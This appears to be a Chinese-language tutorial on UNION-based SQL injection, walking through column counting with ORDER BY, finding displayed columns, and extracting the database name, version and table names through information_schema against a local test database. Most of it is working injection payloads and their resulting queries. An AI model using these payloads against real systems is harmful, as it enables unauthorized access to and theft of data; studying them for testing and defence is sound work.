### 1、在一条sql语句中，执行多条查询
```yaml
UNION操作符选取不重复的值。如果允许重复的值，请使用UNION ALL
渗透大多数情况，使用UNION ALL
```
```sql
SELECT id,username FROM `user` WHERE id = 1 
union all 
SELECT id,username FROM `user` WHERE id = 1;
```
![image](https://github.com/498946975/Security/blob/master/images/sql_10.png)
### 2、information_schema数据库中有三个表非常重要
```yaml
1.schemata:表里包含所有数据库的名字 
2.tables:表里包含所有数据库的所有的表，默认字段为table_name 
3.columns:三个列非常重要
    TABLE_SCHEMA:数据库名 
    TABLE_NAME:表名
    COLUMN_NAME:字段名
```
### 3、联合注入的过程1：
#### 使用order by判断注入点，联合查询的多条语句，列数必须一致
#### 3.1 首先要了解order by，排序
```sql
# 以第一列id为基础，进行排序
SELECT id,username FROM `user` ORDER BY 1;
```
![image](https://github.com/498946975/Security/blob/master/images/sql_11.png)
```sql
# 以第二列，username为基础，进行排序
SELECT id,username FROM `user` ORDER BY 2;
```
![image](https://github.com/498946975/Security/blob/master/images/sql_12.png)
```sql
# 以第三列进行排序，报错
SELECT id,username FROM `user` ORDER BY 3;
```
![image](https://github.com/498946975/Security/blob/master/images/sql_13.png)
#### 3.2 通过上面order by的方式，来判断sql语句返回的数据，有多少列
```sql
1' order by 12 #
```
![image](https://github.com/498946975/Security/blob/master/images/sql_14.png)
```sql
select * from user where username='1' order by 13 #'
```
![image](https://github.com/498946975/Security/blob/master/images/sql_15.png)
```yaml
通过以上数据可以证明，需要渗透的数据库表格中，一共有12列
```
### 4、联合注入的过程2：
### 判断是整型还是字符型
```yaml
判断是整形还是字符型，参考sql注入的2，3号文档
```
### 5、联合注入的过程3:
### 判断显示位，就是哪一列在前端进行了展示
#### 5.1 通过上面的举例，可以看出，一共有12列，那么，可以通过union all，来判断哪几位展示给了前端
```sql
1' union all select 1,2,3,4,5,6,7,8,9,10,11,12  #
```
![image](https://github.com/498946975/Security/blob/master/images/sql_16.png)
```sql
select * from user where username='1' union all select 1,2,3,4,5,6,7,8,9,10,11,12 #';
```
![image](https://github.com/498946975/Security/blob/master/images/sql_17.png)

### 6、联合注入的过程4:
### 获取数据库的名称,和数据库版本
#### 6.1 通过以上的数据，在第二列和第11列，输入函数，显示对应的信息
```sql
1' union all select 1,database(),3,4,5,6,7,8,9,10,version(),12  #
```
![image](https://github.com/498946975/Security/blob/master/images/sql_18.png)
```sql
select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,9,10,version(),12 #'
```
![image](https://github.com/498946975/Security/blob/master/images/sql_19.png)

### 7、联合注入的过程5:
### 巧妙使用group_concat(table_name)函数，获取所有表的名称
#### 7.1 把所有的table_name拼接起来，在第11列进行展示
```sql
1' union all select 1,database(),3,4,5,6,7,8,9,10,group_concat(table_name),12 from information_schema.tables where table_schema = 'test_fastapi'  #
```
![image](https://github.com/498946975/Security/blob/master/images/sql_20.png)
```sql
select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,9,10,group_concat(table_name),12 from information_schema.tables where table_schema = 'test_fastapi' #'
```
![image](https://github.com/498946975/Security/blob/master/images/sql_21.png)
